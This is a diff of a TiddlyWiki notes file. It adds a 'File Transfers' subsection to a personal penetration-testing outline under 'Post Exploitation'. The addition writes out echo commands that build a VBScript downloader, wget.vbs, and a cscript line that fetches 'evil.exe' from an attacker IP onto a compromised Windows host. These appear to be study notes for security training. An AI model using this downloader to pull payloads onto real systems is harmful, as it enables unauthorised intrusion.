@@ -9658,7 +9658,7 @@ OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE." />
 <div created="20210810022253593" modified="20210825230930363" title="$:/state/toc/TableOfContents/Tech-Game Development--118161433">
 <pre>close</pre>
 </div>
-<div created="20211007075548568" list="[[Cyber Security]] [[Binary Exploitation / Pwn]] [[Penetration Testing Framework]] CrappyMakerProgrammer Tech [[Game Development]]" modified="20211008121142175" title="$:/StoryList">
+<div created="20211009100136326" list="CrappyMakerProgrammer Tech [[Cyber Security]] [[Penetration Testing Framework]]" modified="20211009100956595" title="$:/StoryList">
 <pre></pre>
 </div>
 <div plugin-type="info" title="$:/temp/info-plugin" type="application/json">
@@ -11346,7 +11346,7 @@ gpg -d credential.pgp
 
 https://book.hacktricks.xyz/forensics/basic-forensic-methodology/specific-software-file-type-tricks/pdf-file-analysis</pre>
 </div>
-<div created="20210927160738058" modified="20211008121956415" title="Penetration Testing Framework">
+<div created="20210927160738058" modified="20211009112421626" title="Penetration Testing Framework">
 <pre>! Overview
 
 This is a basic Penetration Testing Outline I made
@@ -11512,7 +11512,44 @@ $ stty rows &lt;num&gt; columns &lt;cols&gt;
 ! Post Exploitation
 
 
-# Upload privilege esclation scripts to run</pre>
+# Upload privilege esclation scripts to run
+
+
+!! File Transfers
+
+!!! Windows
+
+```
+echo strUrl = WScript.Arguments.Item(0) &gt; wget.vbs
+echo StrFile = WScript.Arguments.Item(1) &gt;&gt; wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 &gt;&gt; wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 &gt;&gt; wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 &gt;&gt; wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 &gt;&gt; wget.vbs
+echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts &gt;&gt; wget.vbs
+echo Err.Clear &gt;&gt; wget.vbs
+echo Set http = Nothing &gt;&gt; wget.vbs
+echo Set http = CreateObject(&quot;WinHttp.WinHttpRequest.5.1&quot;) &gt;&gt; wget.vbs
+echo If http Is Nothing Then Set http = CreateObject(&quot;WinHttp.WinHttpRequest&quot;) &gt;&gt; wget.vbs
+echo If http Is Nothing Then Set http = CreateObject(&quot;MSXML2.ServerXMLHTTP&quot;) &gt;&gt; wget.vbs
+echo If http Is Nothing Then Set http = CreateObject(&quot;Microsoft.XMLHTTP&quot;) &gt;&gt; wget.vbs
+echo http.Open &quot;GET&quot;,strURL,False &gt;&gt; wget.vbs
+echo http.Send &gt;&gt; wget.vbs
+echo varByteArray = http.ResponseBody &gt;&gt; wget.vbs
+echo Set http = Nothing &gt;&gt; wget.vbs
+echo Set fs = CreateObject(&quot;Scripting.FileSystemObject&quot;) &gt;&gt; wget.vbs
+echo Set ts = fs.CreateTextFile(StrFile,True) &gt;&gt; wget.vbs
+echo strData = &quot;&quot; &gt;&gt; wget.vbs
+echo strBuffer = &quot;&quot; &gt;&gt; wget.vbs
+echo For lngCounter = 0 to UBound(varByteArray) &gt;&gt; wget.vbs
+echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) &gt;&gt; wget.vbs
+echo Next &gt;&gt; wget.vbs
+echo ts.Close &gt;&gt; wget.vbs
+```
+
+```
+cscript wget.vbs http://10.11.0.4/evil.exe evil.exe
+```</pre>
 </div>
 <div created="20210925102955449" modified="20210925104210602" title="Physics">
 <pre>https://hackin7.itch.io/playableunitedreference 
